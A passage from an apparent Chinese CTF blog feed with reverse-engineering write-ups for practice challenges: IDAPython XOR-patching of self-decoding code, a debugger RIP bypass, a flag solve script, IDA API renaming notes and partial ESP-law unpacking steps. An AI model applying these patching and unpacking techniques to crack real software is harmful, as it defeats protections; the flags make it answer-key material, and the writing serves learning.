class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意：<br>在 IDA 7.0 以前的版本中，这个脚本应该这么写（网上很多 WP 就是这么写的）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>add <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是 IDA 7.0 以后，官方对 API 进行了更改<br>如果还是按老版本来写，会报出：<br><code>NameError: name &#39;PatchByte&#39; is not defined</code><br><code>NameError: name &#39;Byte&#39; is not defined</code><br>等错误，因为 <code>PatchByte</code>、<code>Byte</code> 已经不能直接用于新版的 IDA 了</p><p><em>详见《IDA新版与旧版的API变更》</em></p></blockquote><ol start="7"><li><p>可以看到脚本执行前后 <code>judge</code> 中数据的变化<br>脚本执行前：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE4.png" alt="攻防世界_BABYRE4.png"><br>脚本执行后：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE5.png" alt="攻防世界_BABYRE5.png"></p></li><li><p>接下来把这些数据转化为代码<br>从 <code>judge</code> 的首地址 <code>0x600B00</code> 开始，到结尾的位置 <code>0x600BB5</code>，一路按 <code>快捷键 C</code> 将数据转化为代码<br>遇到 IDA 弹窗的，直接转代码，无视即可<br>（<strong>或者直接在 <code>judge</code> 的首地址 <code>C</code> 一下，IDA 会一路将可以转代码的地址全部转过来，最后 <code>P</code> 一下生成函数</strong>）<br>全部 <code>C</code> 完之后如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE6.png" alt="攻防世界_BABYRE6.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE7.png" alt="攻防世界_BABYRE7.png"><br>然后在 <code>judge</code> 首地址的位置，按 <code>快捷键 P</code> 将代码生成函数<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE8.png" alt="攻防世界_BABYRE8.png"><br>最后，像正常函数一样按 <code>快捷键 F5</code> 就可以快乐反编译了</p></li><li><p>得到 <code>judge()</code> 函数的内容如下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE9.png" alt="攻防世界_BABYRE9.png"><br>代码逻辑比较简单，定义了 <code>v2 = &quot;fmcd\x7F&quot;</code>，<code>v3 = &quot;k7d;V&amp;#96;np&quot;</code><br>将输入异或后要与 <code>v2</code> 相等<br>根据循环次数 14 可知，这里是将 <code>v2</code> 和 <code>v3</code> 拼接起来了<br>也可以通过汇编代码查看：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE11.png" alt="攻防世界_BABYRE11.png"><br>接下来编写脚本即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> <span class="token string">"fmcd\x7Fk7d;V`;np"</span>  flag <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>考虑到 <code>judge</code> 是在程序执行过程中自己解码的，所以可以通过动态调试下断点，先让程序自己解码，然后我们再观察解码后的内容</p></li><li><p>由于是 Linux 端的 elf 文件，开启远程调试<br>远程调试的方法<em>详见《IDA的基础和使用》</em></p></li><li><p>在调试之前<br>先在第一条指令 <code>push    rbp</code> 的地方下一个断点<br>然后在输入 <code>call    ___isoc99_scanf</code> 的地方下断点<br>然后开始调试</p></li><li><p>程序开始时停在我们下的第一个断点处<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE12.png" alt="攻防世界_BABYRE12.png"><br>在第二个断点处，<code>右键 --&gt; Run to cursor</code> 直接让程序运行到这里<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE13.png" alt="攻防世界_BABYRE13.png"><br>可以看到，程序的 <code>RIP</code> 指向了我们第二个断点的地方：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE14.png" alt="攻防世界_BABYRE14.png"></p></li><li><p>然后 <code>F8</code> 单步步过<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE15.png" alt="攻防世界_BABYRE15.png"><br>Linux 中程序已经开始让我们输入<br>这里先随便输入一个值，例如我输入：1<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE16.png" alt="攻防世界_BABYRE16.png"><br>程序越过了 scanf 输入，<code>RIP</code> 指向下一条命令</p></li><li><p>由于下面的 <code>jnz     short loc_400698</code> 这一条指令会跳转到 <code>loc_400698</code><br>这个位置是输出 “Wrong!” 用的，并且会导致程序直接结束<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE17.png" alt="攻防世界_BABYRE17.png"><br>所以我们需要<strong>在 <code>jnz     short loc_400698</code> 这一条指令之后，设置一个新的 <code>RIP</code><br>这样一来，输入 “Wrong!” 后，可以迫使程序继续跳转到我们设置的 <code>RIP</code> 的地方，从而绕过输入错误导致的退出<br>但也要注意，我们的目的是让程序自己解码 <code>judge</code> 函数后查看 <code>judge</code> 的内容<br>所以这个 RIP 一定要设置在调用 <code>judge</code> 函数之前，不然无法进入到 <code>judge</code> 函数</strong></p></li><li><p>例如，我将 <code>RIP</code> 设置在 <code>jnz     short loc_400698</code> 的后面一句，即：地址 <code>0x40067A</code> 处<br>然后 <code>右键 --&gt; set IP</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE18.png" alt="攻防世界_BABYRE18.png"><br>同时，在 <code>call    rdx ; judge</code> 调用 <code>judge</code> 函数的地方 <code>F2</code> 下一个断点<br>然后我们直接 <code>F8</code> 就会跳转到刚刚设置 <code>RIP</code> 的位置，从而绕过 <code>loc_400698</code><br>继续 <code>F8</code> 执行到调用 <code>judge</code> 函数的地方，IDA 会询问是否进入这个地址<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE20.png" alt="攻防世界_BABYRE20.png"><br>选择 <code>&quot;Yes&quot;</code>，程序就会进入 <code>judge</code> 函数：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE21.png" alt="攻防世界_BABYRE21.png"><br>这个就是程序自己解码出来的 <code>judge</code> 函数的内容<br>然后选择 <code>judge</code> 函数的内容，使用 <code>快捷键 P</code> 将代码生成函数<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE22.png" alt="攻防世界_BABYRE22.png"><br>最后 <code>F5</code> 即可将 <code>judge</code> 函数反汇编<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE23.png" alt="攻防世界_BABYRE23.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{n1c3_j0b}</p></blockquote><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BABYRE10.png" alt="攻防世界_BABYRE10.png"></p>]]></content>
    
    
    <summary type="html">攻防世界的一道 SMC 自解码题，可以使用 IDA 脚本和动态调试绕过，感觉还是比较经典的，记录一下</summary>
    
    
    
    <category term="逆向" scheme="https://www.4ss1du0us.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>IDA新版与旧版的API变更</title>
    <link href="https://www.4ss1du0us.cn/2023/05bbb01dd.html"/>
    <id>https://www.4ss1du0us.cn/2023/05bbb01dd.html</id>
    <published>2023-05-11T08:11:01.000Z</published>
    <updated>2023-05-12T04:00:01.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDA-的变更"><a href="#IDA-的变更" class="headerlink" title="IDA 的变更"></a>IDA 的变更</h2><blockquote><p>在做逆向的时候，有时会涉及到对硬指令的更改，不论是直接修改还是异或之类的，由于数据量比较大，所以会用到 IDA 提供的脚本编辑器（<code>shift + F2</code>）</p><p>但是网上有些 WP 给出的是比较旧的 IDA 脚本，在新版 IDA 中使用会报出各种 <code>&quot;NameError: name xxx is not defined&quot;</code> 的错误，这是因为 IDA 官方在新版中修改了部分 API 的名称，导致新旧版本不互通</p></blockquote><hr><h3 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h3><ul><li>在旧版本中：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600b00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span> PatchByte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> Byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>在新版本中</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">address <span class="token operator">=</span> <span class="token number">0x600B00</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">182</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ida_bytes<span class="token punctuation">.</span>patch_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">,</span> idc<span class="token punctuation">.</span>get_wide_byte<span class="token punctuation">(</span>address <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>在 IDA 7.0 以后的版本中，要将：<br><code>idc.PatchByte()</code> 改为 <code>ida_bytes.patch_byte()</code><br><code>idc.Byte()</code> 改为 <code>idc.get_wide_byte()</code></p></blockquote><hr><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><blockquote><p>网上解决方法提到了很多，但是我尝试之后，发现大部分方法在我使用的 <a href="https://www.52pojie.cn/">吾爱破解论坛</a> 版的 <a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a> 上无效，最后我是在 IDA 官方文档上解决</p><p>为避免大家再次踩坑，所以记录一下</p></blockquote><hr><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h3><blockquote><p>Hex-Rays 在官网的 <code>The guide</code> 部分列出了新版与旧版 IDA 中 API 的名称变化，需要时可以 <code>ctrl + F</code> 自行查找 API 名称是否变动（一般旧版在函数名前加上 idc，例如 <code>idc.xxx()</code>）</p></blockquote><ul><li>官网地址：<br>  <a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">Porting from IDAPython 6.x-7.3, to 7.4</a></li></ul><hr><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><blockquote><p>其他方法在我的 IDA 版本中无效，但是也搜集了一下，说不定其他版本可以</p></blockquote><ul><li>链接：（见方法 1、方法 2）<br>  <a href="https://www.52pojie.cn/thread-1403005-1-1.html">关于IDA7.5 IDApython api差异问题及解决办法 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></li></ul>]]></content>
    
    
    <summary type="html">有时候网上的 WP 中给出的 IDA 脚本会报出 “NameError: name &#39;PatchByte&#39; is not defined” 等错误，因为有些 API 在新版中被更改了，导致 IDA 老版本与新版本脚本不互通</summary>
    
    
    
    <category term="IDA" scheme="https://www.4ss1du0us.cn/categories/IDA/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
  </entry>
  
  <entry>
    <title>【攻防世界】BabyXor</title>
    <link href="https://www.4ss1du0us.cn/2023/055c53cc97.html"/>
    <id>https://www.4ss1du0us.cn/2023/055c53cc97.html</id>
    <published>2023-05-10T14:43:39.000Z</published>
    <updated>2023-06-07T12:34:43.984Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>使用 ESP 定律法进行脱壳</mark></p></li><li><p>使用 <code>int __cdecl _filbuf(FILE *)</code> 函数实现 <code>get</code> 输入</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1c1c2eff3fdc4f1893aa0b72c6c9f116.zip">【攻防世界】BabyXor</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>用 exeinfo PE 打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor1.png" alt="攻防世界_BabyXor1.png"><br>貌似有壳，提示用 DIE v3.x 查看，但是依然检测不出来<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor2.png" alt="攻防世界_BabyXor2.png"></p></li><li><p>用 IDA 打开，发现无法反汇编：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor3.png" alt="攻防世界_BabyXor3.png"><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor4.png" alt="攻防世界_BabyXor4.png"></p></li><li><p>因为加了壳，IDA 中什么都看不到<br>先用 OllyDBG 打开调试：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor5.png" alt="攻防世界_BabyXor5.png"><br>首先看到 <code>pushad</code><br><code>pushad</code> 是将所有的寄存器压栈，一般是开始位置<br>在地址 <code>0x0043F01E</code> 之后，有很多 <code>add byte ptr ds:[eax], al</code> 的操作，无法直接看到正常的汇编代码<br>但是在地址 <code>0x0043F012</code> 到 <code>0x0043F016</code> 之间可以看到一个循环操作：</p></li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0043F</span><span class="token number">012</span>    <span class="token number">8033</span> <span class="token number">23</span>         xor byte ptr ds<span class="token operator">:</span><span class="token punctuation">[</span>ebx<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token number">0043F</span><span class="token number">015</span>    <span class="token number">43</span>              inc ebx<span class="token number">0043F</span><span class="token number">016</span>  <span class="token operator">^</span> E0 FA           loopdne <span class="token keyword">short</span> babyXor<span class="token punctuation">.</span><span class="token number">0043F</span><span class="token number">012</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>这里使用循环 xor 来修正代码，所以导致 IDA 无法正常解析<br>从 <code>pushad</code> 开始<br><strong>先 F8 单步步过一次</strong>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor6.png" alt="攻防世界_BabyXor6.png"><br><strong>观察右侧寄存器窗口，发现 EAX ~ EDI 中只有 ESP 为红色，说明可以使用 ESP 定律进行脱壳</strong></p></li><li><p>在寄存器窗口中选中 ESP，<code>右键 --&gt; 数据窗口中跟随</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor7.png" alt="攻防世界_BabyXor7.png"><br>注意数据窗口中是否跳转：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor8.png" alt="攻防世界_BabyXor8.png"><br>从该地址处的第一个字节开始（我这里是 00），<strong>左键选择任意长度的数据</strong><br>然后<code>右键 --&gt; 断点 --&gt; 硬件访问 --&gt; Byte/Word/Dword</code>（三选一，均可）<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor9.png" alt="攻防世界_BabyXor9.png"><br>检查一下断点是否成功：<code>调试 --&gt; 硬件断点</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor10.png" alt="攻防世界_BabyXor10.png"><br>直接 <code>F9</code> 运行程序<br>然后 <code>F8</code> 连续单步步过找到 OEP（程序的入口点）<br>程序停在地址 <code>0x0043F019</code> 的位置<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor11.png" alt="攻防世界_BabyXor11.png"><br>在脱壳之前，先删除前面下的断点：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor12.png" alt="攻防世界_BabyXor12.png"><br>在停下的地址处：<code>右键 --&gt; 用 OllyDump脱壳调试进程</code><br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor13.png" alt="攻防世界_BabyXor13.png"><br>点击脱壳，并将脱壳后的程序进行保存<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor14.png" alt="攻防世界_BabyXor14.png"></p></li><li><p>将保存后的程序用 exeinfo PE 打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor15.png" alt="攻防世界_BabyXor15.png"><br>已经显示无壳<br>用 IDA 打开：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor16.png" alt="攻防世界_BabyXor16.png"><br>已经可以被 IDA 正常分析了，脱壳成功</p></li><li><p>进入主函数<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor17.png" alt="攻防世界_BabyXor17.png"><br>开始的两句作用是输出：”世界上最简单的Xor”<br>注意到后面有一个 <code>if else</code> 语句：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor18.png" alt="攻防世界_BabyXor18.png"><br>这个不是很懂，但是在网上看到了比较好的解释：<a href="https://www.cnblogs.com/volcanol/archive/2011/06/09/2076907.html">C语言学习趣事_关于C语言中的输入输出流_续一 - volcanol</a><br>这段代码实现的是 <code>getc()</code> 函数，即：获取用户的输入<br>其实根据运行程序时的输出，也大致可以猜到，不影响做题</p></li></ol><blockquote><p><code>getc()</code></p><p>在 VC 6.0 中有两个 <code>get()</code> 的定义， 一个是宏，一个是函数</p><ol><li>宏的定义如下：<br>  <code>#define getc(_stream) (--(_stream)-&gt;_cnt &gt;= 0 ? 0xff &amp; *(_stream)-&gt;_ptr++ : _filbuf(_stream))</code></li><li>函数定义如下：<br>  <code>_CRTIMP int __cdecl getc(FILE *)</code></li></ol><p>在Ｃ语言的各家编译器提供厂商里面有一个不成为的“潜规则”，那就是：<br><strong>如果一个标识符前面是以下划线开头，这样的标识符通常是编译器预定义的宏，或者预定义的标志符</strong></p><p>我们看宏定义，这里用到的宏实际还用到了一个预定义的函数：<br><code>_CRTIMP int __cdecl _filbuf(FILE *)</code></p><p>从这个函数可以看出在 <code>getc()</code> 宏中使用的：<code>_stream</code> 是一个具有文件指针类型性质的预定义标识符</p></blockquote><p>在 IDA 伪代码中，<code>_filbuf(&amp;File)</code> 的定义：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor19.png" alt="攻防世界_BabyXor19.png"></p><ol start="8"><li><p>继续往下：<br><code>v8 = sub_40108C(&amp;unk_435DC0, 56)</code> 函数会执行 <code>sub_401190(a1, a2)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor20.png" alt="攻防世界_BabyXor20.png"><br>内容就是简单的移位、异或操作，最后将结果返回给 <code>v8</code><br><code>Src = sub_401041(&amp;unk_435DC0, &amp;dword_435DF8, 0x38u)</code> 函数会执行 <code>sub_401240(a1, a2, Size)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor21.png" alt="攻防世界_BabyXor21.png"><br>操作也是移位、异或，将结果返回给 <code>Src</code><br><code>v5 = sub_4010C3(&amp;unk_435DC0, Src, &amp;dword_435E30, 56)</code> 函数会执行 <code>sub_401320(a1, a2, a3, a4)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor22.png" alt="攻防世界_BabyXor22.png"><br>跟前面都是差不多的，也是移位、异或，最后将结果返回给 <code>v5</code><br>最后执行 <code>sub_40101E(v8, Src, v5)</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor23.png" alt="攻防世界_BabyXor23.png"><br>发现三个通过 <code>for</code> 循环的赋值操作<br>同时，三个参数都使用 <code>sub_4010A5()</code> 函数进行了处理，<code>sub_4010A5()</code> 函数会执行 <code>sub_401460(a1)</code><br>跟进一下：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor24.png" alt="攻防世界_BabyXor24.png"><br>这里的 <code>i</code> 是一个指针，<code>a1</code> 也是一个指针<br>首先将 <code>i</code> 的初值设置为 <code>a1</code> 所指向的地址（其实就是参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的首地址）<br>for 循环的结束条件就是将 <code>a1</code> 所指向的非 <code>&#39;\0&#39;</code> 元素全部遍历完，也就是 <code>i</code> 指向参数 <code>v8</code>、<code>Src</code>、<code>v5</code> 各自的末尾<br>最后返回的 <code>i - a1</code> 是两个地址的差，差值其实就是字符串的长度<br>再结合三个 for 循环的内容，可知：<br><code>sub_40101E(v8, Src, v5)</code> 函数的功能是将 a1( <code>v8</code> )、a2( <code>Src</code> )、a3( <code>v5</code> ) 的内容拼接到 <code>v10</code> 所指向的地址中</p></li><li><p>查看一下这三个移位、异或函数所使用的数据<br><code>unk_435DC0</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor25.png" alt="攻防世界_BabyXor25.png"><br><code>dword_435DF8</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor26.png" alt="攻防世界_BabyXor26.png"><br><code>dword_435E30</code>：<br><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_BabyXor27.png" alt="攻防世界_BabyXor27.png"></p></li><li><p>通过 IDA 生成 Python 列表：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unk_435DC0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token 